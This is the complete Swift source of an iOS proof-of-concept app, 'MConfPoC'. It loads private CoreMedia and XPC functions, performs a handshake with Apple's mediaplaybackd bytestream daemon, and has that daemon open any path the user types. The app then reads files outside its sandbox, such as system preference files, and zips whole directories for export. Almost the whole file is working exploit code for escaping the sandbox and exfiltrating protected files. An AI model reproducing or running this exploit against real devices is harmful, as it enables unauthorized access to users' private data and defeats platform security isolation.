//
//  ContentView.swift
//  MConfPoC
//
//  CoreMedia bytestream PoC with Resilient POSIX Directory Traversal & ZIP Export.
//  Runs only on explicit Run-button press. The target path is supplied in the UI.
//  Results and short execution messages are saved inside Documents/.
//

import Foundation
import SwiftUI
import UIKit
import Darwin
import CoreFoundation

// MARK: - Logging

private let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
private var logFd: Int32 = -1

private func resetSessionLogFile() {
    let path = docs.appendingPathComponent("run.log").path
    let fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0o644)
    if fd >= 0 { close(fd) }
}

private func openLog() {
    if logFd >= 0 { close(logFd); logFd = -1 }
    let path = docs.appendingPathComponent("run.log").path
    logFd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0o644)
}

private final class EHBox {
    var desc = ""
    var seen = false
}

private func releaseFigReference(_ pointer: UnsafeMutableRawPointer?) {
    guard let pointer else { return }
    Unmanaged<CFTypeRef>.fromOpaque(pointer).release()
}

// MARK: - Simple In-Memory ZIP Creator (Store Method)

private struct ZipWriter {
    private var data = Data()
    private var directoryRecords = Data()
    private var fileCount: UInt16 = 0

    mutating func addFile(relativePath: String, fileData: Data) {
        let pathBytes = Array(relativePath.utf8)
        let pathLength = UInt16(pathBytes.count)
        let fileOffset = UInt32(data.count)
        let crc = crc32(fileData)
        let fileSize = UInt32(fileData.count)

        // Local File Header
        var header = Data()
        header.append(contentsOf: [0x50, 0x4b, 0x03, 0x04]) // Signature
        header.append(contentsOf: [0x14, 0x00])             // Version needed (2.0)
        header.append(contentsOf: [0x00, 0x00])             // General flag
        header.append(contentsOf: [0x00, 0x00])             // Compression: 0 (Store)
        header.append(contentsOf: [0x00, 0x00, 0x00, 0x00]) // Mod time/date
        header.append(withUnsafeBytes(of: crc) { Data($0) })
        header.append(withUnsafeBytes(of: fileSize) { Data($0) })
        header.append(withUnsafeBytes(of: fileSize) { Data($0) })
        header.append(withUnsafeBytes(of: pathLength) { Data($0) })
        header.append(contentsOf: [0x00, 0x00])             // Extra field length
        header.append(contentsOf: pathBytes)

        data.append(header)
        data.append(fileData)

        // Central Directory Structure
        var cdRecord = Data()
        cdRecord.append(contentsOf: [0x50, 0x4b, 0x01, 0x02]) // Signature
        cdRecord.append(contentsOf: [0x14, 0x00])             // Version made by
        cdRecord.append(contentsOf: [0x14, 0x00])             // Version needed
        cdRecord.append(contentsOf: [0x00, 0x00])             // General flag
        cdRecord.append(contentsOf: [0x00, 0x00])             // Compression: 0
        cdRecord.append(contentsOf: [0x00, 0x00, 0x00, 0x00]) // Mod time/date
        cdRecord.append(withUnsafeBytes(of: crc) { Data($0) })
        cdRecord.append(withUnsafeBytes(of: fileSize) { Data($0) })
        cdRecord.append(withUnsafeBytes(of: fileSize) { Data($0) })
        cdRecord.append(withUnsafeBytes(of: pathLength) { Data($0) })
        cdRecord.append(contentsOf: [0x00, 0x00])             // Extra field length
        cdRecord.append(contentsOf: [0x00, 0x00])             // Comment length
        cdRecord.append(contentsOf: [0x00, 0x00])             // Disk number start
        cdRecord.append(contentsOf: [0x00, 0x00])             // Internal file attributes
        cdRecord.append(contentsOf: [0x00, 0x00, 0x00, 0x00]) // External file attributes
        cdRecord.append(withUnsafeBytes(of: fileOffset) { Data($0) })
        cdRecord.append(contentsOf: pathBytes)

        directoryRecords.append(cdRecord)
        fileCount += 1
    }

    mutating func finalize() -> Data {
        let cdOffset = UInt32(data.count)
        let cdSize = UInt32(directoryRecords.count)

        data.append(directoryRecords)

        // End of Central Directory Record (EOCD)
        var eocd = Data()
        eocd.append(contentsOf: [0x50, 0x4b, 0x05, 0x06])     // Signature
        eocd.append(contentsOf: [0x00, 0x00])                 // Disk number
        eocd.append(contentsOf: [0x00, 0x00])                 // Disk with CD
        eocd.append(withUnsafeBytes(of: fileCount) { Data($0) }) // CD entries on disk
        eocd.append(withUnsafeBytes(of: fileCount) { Data($0) }) // Total CD entries
        eocd.append(withUnsafeBytes(of: cdSize) { Data($0) })
        eocd.append(withUnsafeBytes(of: cdOffset) { Data($0) })
        eocd.append(contentsOf: [0x00, 0x00])                 // Comment length

        data.append(eocd)
        return data
    }

    private func crc32(_ data: Data) -> UInt32 {
        var crc: UInt32 = 0xffffffff
        for byte in data {
            let index = Int((crc ^ UInt32(byte)) & 0xff)
            crc = (crc >> 8) ^ ZipWriter.crc32Table[index]
        }
        return crc ^ 0xffffffff
    }

    private static let crc32Table: [UInt32] = {
        (0...255).map { i -> UInt32 in
            var c = UInt32(i)
            for _ in 0..<8 {
                if (c & 1) != 0 {
                    c = 0xedb88320 ^ (c >> 1)
                } else {
                    c = c >> 1
                }
            }
            return c
        }
    }()
}

// MARK: - POSIX Directory Traversal (Sandbox Bypass for Listing)

private func listDirectoryRecursivePOSIX(path: String) -> [String] {
    var results: [String] = []
    
    func scan(currentPath: String, relativeTo root: String) {
        guard let dir = opendir(currentPath) else { return }
        defer { closedir(dir) }
        
        while let entry = readdir(dir) {
            let nameC = withUnsafePointer(to: entry.pointee.d_name) {
                $0.withMemoryRebound(to: CChar.self, capacity: Int(NAME_MAX)) {
                    String(cString: $0)
                }
            }
            
            if nameC == "." || nameC == ".." { continue }
            
            let fullPath = (currentPath as NSString).appendingPathComponent(nameC)
            let rootNormalized = (root as NSString).standardizingPath
            let fullNormalized = (fullPath as NSString).standardizingPath
            
            let relPath: String
            if fullNormalized.hasPrefix(rootNormalized + "/") {
                let idx = fullNormalized.index(rootNormalized.startIndex, offsetBy: rootNormalized.count + 1)
                relPath = String(fullNormalized[idx...])
            } else {
                relPath = nameC
            }
            
            var st = stat()
            if lstat(fullPath, &st) == 0 {
                if (st.st_mode & S_IFMT) == S_IFDIR {
                    scan(currentPath: fullPath, relativeTo: root)
                } else if (st.st_mode & S_IFMT) == S_IFREG {
                    results.append(relPath)
                }
            }
        }
    }
    
    scan(currentPath: path, relativeTo: path)
    return results
}

// MARK: - Helper Types & Utilities

private let legacyTargetPath = "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"

private func outputFilename(for targetPath: String) -> String {
    let name = URL(fileURLWithPath: targetPath).lastPathComponent
    let safeName = name.isEmpty || name == "/" ? "target.bin" : name
    return "Recovered-" + safeName
}

private struct ActivityView: UIViewControllerRepresentable {
    let activityItems: [Any]

    func makeUIViewController(context: Context) -> UIActivityViewController {
        UIActivityViewController(activityItems: activityItems, applicationActivities: nil)
    }

    func updateUIViewController(_ controller: UIActivityViewController, context: Context) {}
}

// MARK: - ContentView

struct ContentView: View {
    @State private var status = "Ready"
    @State private var isRunning = false
    @State private var targetPath = ""
    @State private var logs: [String] = []
    @State private var showExport = false
    @State private var resultURL: URL? = nil
    @State private var didResetSessionLog = false

    private let panelColor = Color(uiColor: .secondarySystemBackground)
    private let panelShape = RoundedRectangle(cornerRadius: 20, style: .continuous)

    var body: some View {
        GeometryReader { geometry in
            VStack(alignment: .leading, spacing: 14) {
                VStack(alignment: .leading, spacing: 10) {
                    Text("CoreMedia PoC")
                        .font(.headline)
                    Text(status)
                        .font(.system(.footnote, design: .monospaced))
                        .foregroundStyle(.secondary)
                }

                VStack(alignment: .leading, spacing: 6) {
                    Text("Target path")
                        .font(.footnote)
                        .foregroundStyle(.secondary)
                    TextField("Enter file or directory path", text: $targetPath)
                        .font(.system(.body, design: .monospaced))
                        .textInputAutocapitalization(.never)
                        .autocorrectionDisabled()
                        .textFieldStyle(.plain)
                        .padding(.horizontal, 14)
                        .padding(.vertical, 16)
                        .background(panelColor)
                        .clipShape(panelShape)
                        .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
                }

                Button {
                    guard !isRunning else { return }
                    isRunning = true
                    status = "Running…"
                    resultURL = nil
                    if !logs.isEmpty {
                        logs.append("──────── New run ────────")
                    }
                    let requestedPath = targetPath.trimmingCharacters(in: .whitespacesAndNewlines)
                    DispatchQueue.global(qos: .userInitiated).async {
                        runChain(targetPath: requestedPath) { line, savedURL in
                            DispatchQueue.main.async {
                                logs.append(line)
                                if let savedURL = savedURL {
                                    resultURL = savedURL
                                }
                            }
                        }
                        DispatchQueue.main.async {
                            isRunning = false
                            status = "Finished — see Documents/run.log"
                        }
                    }
                } label: {
                    Text(isRunning ? "Running…" : "Run")
                        .font(.system(size: 18, weight: .medium))
                        .foregroundStyle(.white)
                        .frame(maxWidth: .infinity)
                        .frame(height: 58)
                        .contentShape(panelShape)
                }
                .buttonStyle(.plain)
                .background(Color(uiColor: .systemBlue), in: panelShape)
                .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
                .disabled(isRunning)

                HStack {
                    Text("Run Log")
                        .font(.headline)
                        .foregroundStyle(.secondary)
                    Spacer()
                    Button("Clear", role: .destructive) {
                        logs.removeAll()
                        resetSessionLogFile()
                    }
                    .disabled(isRunning)
                }

                ScrollViewReader { proxy in
                    ScrollView {
                        VStack(alignment: .leading, spacing: 5) {
                            ForEach(Array(logs.enumerated()), id: \.offset) { index, line in
                                Text(line)
                                    .font(.system(.caption, design: .monospaced))
                                    .frame(maxWidth: .infinity, alignment: .leading)
                                    .id(index)
                            }
                        }
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .padding(12)
                    }
                    .onChange(of: logs.count) { _ in
                        if let lastIndex = logs.indices.last {
                            proxy.scrollTo(lastIndex, anchor: .bottom)
                        }
                    }
                }
                .frame(maxWidth: .infinity, maxHeight: .infinity)
                .background(panelColor)
                .clipShape(panelShape)
                .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))

                Button {
                    guard resultURL != nil else { return }
                    showExport = true
                } label: {
                    Label("Export result", systemImage: "square.and.arrow.up")
                        .font(.body.weight(.medium))
                        .foregroundStyle(.primary)
                        .frame(maxWidth: .infinity)
                        .frame(height: 50)
                        .contentShape(RoundedRectangle(cornerRadius: 16, style: .continuous))
                }
                .buttonStyle(.plain)
                .background(panelColor, in: RoundedRectangle(cornerRadius: 16, style: .continuous))
                .overlay(RoundedRectangle(cornerRadius: 16, style: .continuous).stroke(Color.white.opacity(0.07), lineWidth: 1))
                .disabled(resultURL == nil || isRunning)
                .opacity(resultURL == nil || isRunning ? 0.45 : 1)
            }
            .padding(.horizontal)
            .padding(.top, 84)
            .padding(.bottom, 8)
            .frame(width: geometry.size.width, height: geometry.size.height, alignment: .top)
        }
        .background(Color.black.ignoresSafeArea())
        .preferredColorScheme(.dark)
        .onAppear {
            guard !didResetSessionLog else { return }
            resetSessionLogFile()
            didResetSessionLog = true
        }
        .sheet(isPresented: $showExport) {
            if let resultURL = resultURL {
                ActivityView(activityItems: [resultURL])
            }
        }
    }
}

// MARK: - The Chain & Core Processing

private func runChain(targetPath requestedPath: String, onLog: @escaping (String, URL?) -> Void) {
    openLog()
    defer { if logFd >= 0 { close(logFd); logFd = -1 } }
    
    func logLine(_ message: String, resultURL: URL? = nil) {
        let line = message + "\n"
        if logFd >= 0 { _ = line.withCString { write(logFd, $0, strlen($0)) } }
        onLog(message, resultURL)
    }

    logLine("Run started")
    let dev = UIDevice.current
    logLine("Device: \(dev.model), iOS \(dev.systemVersion)")

    let targetPath = requestedPath.trimmingCharacters(in: .whitespacesAndNewlines)
    guard !targetPath.isEmpty, targetPath.hasPrefix("/") else {
        logLine("Invalid target: enter an absolute path")
        logLine("Run finished")
        return
    }
    logLine("Target: \(targetPath)")

    // Step 1 — resolve symbols.
    guard let cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW | RTLD_LOCAL) else {
        logLine("CoreMedia load failed"); return
    }
    let rtld = UnsafeMutableRawPointer(bitPattern: -2)
    guard let pBasic = dlsym(cm, "FigXPCCreateBasicMessage"),
          let pBegin = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1"),
          let pComp  = dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2"),
          let pRecip = dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2"),
          let pSetURL = dlsym(cm, "FigXPCMessageSetCFURL"),
          let pConnCreate = dlsym(rtld, "xpc_connection_create_mach_service"),
          let pSetEH = dlsym(rtld, "xpc_connection_set_event_handler"),
          let pResume = dlsym(rtld, "xpc_connection_resume"),
          let pConnCancel = dlsym(rtld, "xpc_connection_cancel"),
          let pSendReply = dlsym(rtld, "xpc_connection_send_message_with_reply"),
          let pVal = dlsym(rtld, "xpc_dictionary_get_value"),
          let pU64 = dlsym(rtld, "xpc_dictionary_get_uint64"),
          let pSetU64 = dlsym(rtld, "xpc_dictionary_set_uint64"),
          let pDupFd = dlsym(rtld, "xpc_dictionary_dup_fd"),
          let pI64 = dlsym(rtld, "xpc_dictionary_get_int64"),
          let pDesc = dlsym(rtld, "xpc_copy_description"),
          let pType = dlsym(rtld, "xpc_get_type"),
          let pTypeName = dlsym(rtld, "xpc_type_get_name"),
          let pRetain = dlsym(rtld, "xpc_retain"),
          let pRel = dlsym(rtld, "xpc_release") else {
        logLine("Required symbol missing"); return
    }

    typealias FBasic = @convention(c) (UInt32, UInt64, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FBegin = @convention(c) (UnsafeMutableRawPointer?) -> Int32
    typealias FComp = @convention(c) (OpaquePointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FRecip = @convention(c) (OpaquePointer?, UnsafeMutableRawPointer?, UnsafePointer<CChar>?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FSetURL = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>, UnsafeRawPointer?) -> Int32
    typealias FConnCreate = @convention(c) (UnsafePointer<CChar>, UnsafeMutableRawPointer?, UInt64) -> UnsafeMutableRawPointer?
    typealias FSetEH = @convention(c) (UnsafeMutableRawPointer?, AnyObject) -> Void
    typealias FResume = @convention(c) (UnsafeMutableRawPointer?) -> Void
    typealias FConnCancel = @convention(c) (UnsafeMutableRawPointer?) -> Void
    typealias FSendReply = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, AnyObject) -> Void
    typealias FVal = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> OpaquePointer?
    typealias FU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> UInt64
    typealias FSetU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UInt64) -> Void
    typealias FDupFd = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int32
    typealias FI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int64
    typealias FDesc = @convention(c) (OpaquePointer?) -> UnsafeMutablePointer<CChar>?
    typealias FType = @convention(c) (OpaquePointer?) -> OpaquePointer?
    typealias FTypeName = @convention(c) (OpaquePointer?) -> UnsafePointer<CChar>?
    typealias FRetain = @convention(c) (OpaquePointer?) -> Void
    typealias FRel = @convention(c) (OpaquePointer?) -> Void

    let fBasic = unsafeBitCast(pBasic, to: FBasic.self)
    let fBegin = unsafeBitCast(pBegin, to: FBegin.self)
    let fComp = unsafeBitCast(pComp, to: FComp.self)
    let fRecip = unsafeBitCast(pRecip, to: FRecip.self)
    let fSetURL = unsafeBitCast(pSetURL, to: FSetURL.self)
    let fConnCreate = unsafeBitCast(pConnCreate, to: FConnCreate.self)
    let fSetEH = unsafeBitCast(pSetEH, to: FSetEH.self)
    let fResume = unsafeBitCast(pResume, to: FResume.self)
    let fConnCancel = unsafeBitCast(pConnCancel, to: FConnCancel.self)
    let fSendReply = unsafeBitCast(pSendReply, to: FSendReply.self)
    let fVal = unsafeBitCast(pVal, to: FVal.self)
    let fU64 = unsafeBitCast(pU64, to: FU64.self)
    let fSetU64 = unsafeBitCast(pSetU64, to: FSetU64.self)
    let fDupFd = unsafeBitCast(pDupFd, to: FDupFd.self)
    let fI64 = unsafeBitCast(pI64, to: FI64.self)
    let fDesc = unsafeBitCast(pDesc, to: FDesc.self)
    let fType = unsafeBitCast(pType, to: FType.self)
    let fTypeName = unsafeBitCast(pTypeName, to: FTypeName.self)
    let fRetain = unsafeBitCast(pRetain, to: FRetain.self)
    let fRel = unsafeBitCast(pRel, to: FRel.self)

    func desc(_ o: OpaquePointer?) -> String {
        guard let o = o, let c = fDesc(o) else { return "nil" }
        defer { free(c) }
        return String(cString: c).replacingOccurrences(of: "\n", with: " ")
    }
    func typeName(_ o: OpaquePointer?) -> String {
        guard let o = o, let t = fType(o), let n = fTypeName(t) else { return "?" }
        return String(cString: n)
    }

    // Step 2 — connect.
    guard let conn = "com.apple.coremedia.mediaplaybackd.bytestream.xpc".withCString({ fConnCreate($0, nil, 0) }) else {
        logLine("XPC connection failed"); return
    }
    let ehBox = EHBox()
    let eh: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
        guard let obj = obj else { return }
        ehBox.desc = "\(typeName(OpaquePointer(obj))): \(String(desc(OpaquePointer(obj)).prefix(200)))"
        ehBox.seen = true
    }
    fSetEH(conn, eh as AnyObject)
    fResume(conn)
    logLine("XPC connected")

    func send(_ m: UnsafeMutableRawPointer?) -> (OpaquePointer?, String) {
        guard let m = m else { return (nil, "nil") }
        let sem = DispatchSemaphore(value: 0)
        var out: OpaquePointer? = nil
        var tn = "?"
        let hb: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
            guard let obj = obj else { sem.signal(); return }
            tn = typeName(OpaquePointer(obj))
            if tn == "dictionary" || tn == "error" {
                fRetain(OpaquePointer(obj))
                out = OpaquePointer(obj)
            }
            sem.signal()
        }
        fSendReply(conn, m, nil, hb as AnyObject)
        if sem.wait(timeout: .now() + 8) != .success { return (nil, "timeout-8s") }
        return (out, tn)
    }

    // Step 3 — handshake.
    var memoryRecipient: UnsafeMutableRawPointer? = nil
    var memoryOrigin: UnsafeMutableRawPointer? = nil
    var rp2Ready = false
    var handshakeReady = false

    var rp1Msg: UnsafeMutableRawPointer? = nil
    if fBasic(0x2e727031, 0, &rp1Msg) == 0, let m1 = rp1Msg {
        let (r1, t1) = send(m1)
        let replyDetail = (t1 == "error") ? " — \(desc(r1))" : ""
        logLine("Handshake 1: \(t1)\(replyDetail)")
        fRel(OpaquePointer(m1))

        if let r1 = r1, t1 == "dictionary" {
            var rp2Msg: UnsafeMutableRawPointer? = nil
            if fBasic(0x2e727032, 0, &rp2Msg) == 0, let m2 = rp2Msg {
                let cr = "mconf".withCString { fRecip(r1, m2, $0, &memoryRecipient) }
                logLine("Recipient creation: status=\(cr)")

                if cr == 0, memoryRecipient != nil {
                    let (r2, t2) = send(m2)
                    let replyDetail2 = (t2 == "error") ? " — \(desc(r2))" : ""
                    logLine("Handshake 2: \(t2)\(replyDetail2)")
                    rp2Ready = (t2 == "dictionary" && r2 != nil)
                    if let r2 = r2 { fRel(r2) }
                }
                fRel(OpaquePointer(m2))
            }
            fRel(r1)
        }
    }

    if rp2Ready {
        var orgMsg: UnsafeMutableRawPointer? = nil
        if fBasic(0x2e6f7267, 0, &orgMsg) == 0, let om = orgMsg {
            let bg = fBegin(om)
            logLine("Origin begin: status=\(bg)")
            if bg == 0 {
                let (or, ot) = send(om)
                let originReplyDetail = (ot == "error") ? " — \(desc(or))" : ""
                logLine("Origin: \(ot)\(originReplyDetail)")
                if let or = or {
                    if ot == "dictionary" {
                        let cp = fComp(or, &memoryOrigin)
                        handshakeReady = (cp == 0 && memoryOrigin != nil)
                        logLine("Origin established: \(handshakeReady ? "yes" : "no (status=\(cp))")")
                    }
                    fRel(or)
                }
            }
            fRel(OpaquePointer(om))
        }
    }

    // Safely attempts to fetch raw file data via CoreMedia. Non-throwing, returns nil on failure.
    func fetchFileData(at path: String) -> Data? {
        let cfURL = URL(fileURLWithPath: path) as CFURL
        var msg: UnsafeMutableRawPointer? = nil
        guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else { return nil }
        
        _ = fSetURL(m, "CreationURL", Unmanaged.passUnretained(cfURL).toOpaque())
        fSetU64(OpaquePointer(m), "FileOpenOptions", 0)
        let (rp, rt) = send(m)
        fRel(OpaquePointer(m))
        
        guard rt == "dictionary", let rp = rp else { return nil }
        guard let details = fVal(rp, "ByteStreamDetails") else {
            fRel(rp); return nil
        }
        let oid = fU64(details, "ObjectID")
        let fd = fDupFd(details, "FileDescriptor")
        
        var readData: Data? = nil
        if fd >= 0 {
            defer { close(fd) }
            var st = stat()
            if fstat(fd, &st) == 0, (st.st_mode & 0o170000) == 0o100000 {
                let size = Int(st.st_size)
                if size > 0 {
                    var buffer = [UInt8](repeating: 0, count: size)
                    let count = pread(fd, &buffer, buffer.count, 0)
                    if count > 0 {
                        readData = Data(buffer.prefix(count))
                    }
                }
            }
        }
        
        // Close stream on daemon
        var mD: UnsafeMutableRawPointer? = nil
        if fBasic(0x646f6f6d, oid, &mD) == 0, let mD = mD {
            let (rd, _) = send(mD)
            if let rd = rd { fRel(rd) }
            fRel(OpaquePointer(mD))
        }
        fRel(rp)
        return readData
    }

    // Step 4 — Main processing (Directory vs Single File)
    if handshakeReady {
        var isDir: ObjCBool = false
        let fm = FileManager.default
        
        // Проверяем, является ли целевой путь директорией
        let targetExists = fm.fileExists(atPath: targetPath, isDirectory: &isDir)
        
        if targetExists, isDir.boolValue {
            // --- DIRECTORY MODE ---
            logLine("Target is a directory. Enumerating via POSIX fallback...")
            
            let subpaths = listDirectoryRecursivePOSIX(path: targetPath)
            logLine("Found \(subpaths.count) items in directory")
            
            var zip = ZipWriter()
            var readSuccessCount = 0
            var readErrorCount = 0
            
            for relPath in subpaths {
                let fullPath = (targetPath as NSString).appendingPathComponent(relPath)
                logLine("Reading: \(relPath)")
                
                if let fileData = fetchFileData(at: fullPath) {
                    zip.addFile(relativePath: relPath, fileData: fileData)
                    readSuccessCount += 1
                } else {
                    logLine("Skipped (read failed): \(relPath)")
                    readErrorCount += 1
                }
            }
            
            let zipData = zip.finalize()
            let targetName = URL(fileURLWithPath: targetPath).lastPathComponent
            let archiveName = "RecoveredFolder-\(targetName.isEmpty ? "Directory" : targetName).zip"
            let outputURL = docs.appendingPathComponent(archiveName)
            
            do {
                try zipData.write(to: outputURL, options: .atomic)
                logLine("Saved ZIP archive (\(readSuccessCount) files read, \(readErrorCount) skipped, \(zipData.count) bytes): \(archiveName)", resultURL: outputURL)
            } catch {
                logLine("Failed to save ZIP: \(error.localizedDescription)")
            }
            
        } else {
            // --- SINGLE FILE MODE ---
            let outputName = targetPath == legacyTargetPath ? "GlobalPreferences.plist" : outputFilename(for: targetPath)
            if let data = fetchFileData(at: targetPath) {
                let outputURL = docs.appendingPathComponent(outputName)
                do {
                    try data.write(to: outputURL, options: .atomic)
                    logLine("Saved \(data.count) bytes: \(outputName)", resultURL: outputURL)
                } catch {
                    logLine("Save failed: \(error.localizedDescription)")
                }
            } else {
                logLine("Failed to read target file")
            }
        }
    } else {
        logLine("Read skipped: memory-origin handshake was not established")
    }

    // Cleanup
    releaseFigReference(memoryOrigin)
    memoryOrigin = nil
    releaseFigReference(memoryRecipient)
    memoryRecipient = nil

    fConnCancel(conn)
    fRel(OpaquePointer(conn))
    logLine("XPC connection cancelled and released")
    logLine("Run finished")
}
